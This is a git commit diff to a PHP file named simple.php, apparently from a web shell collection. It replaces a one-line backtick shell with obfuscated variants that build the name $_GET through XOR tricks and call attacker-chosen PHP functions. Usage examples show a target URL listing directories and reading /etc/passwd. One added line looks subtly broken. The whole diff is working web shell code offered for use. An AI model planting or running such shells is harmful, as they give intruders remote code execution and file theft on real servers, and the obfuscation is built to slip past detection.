ebdd18de1954952df999e94177b0fbb1a627d4b0
Yinon Gindi <119297985+YinonGindi@users.noreply.github.com>
2025-08-20 11:13:22 +0300

    Update simple.php

--- simple.php
+++ simple.php
@@ -1,3 +1,7 @@
-<?=`$_GET[0]`?>
+<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]($_[2])); ?>
+<?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]($_[2])); ?>
 
-[*] Usage: http://target.com/path/to/shell.php?0=command
+[*] Usage: http://target.com/path/to/shell.php?0=function1&1=function2&2=argument
+[*] E.g.:
+    - http://target.com/path/to/shell.php?0=var_dump&1=scandir&2=.
+    - http://target.com/path/to/shell.php?0=print_r&1=file_get_contents&2=/etc/passwd
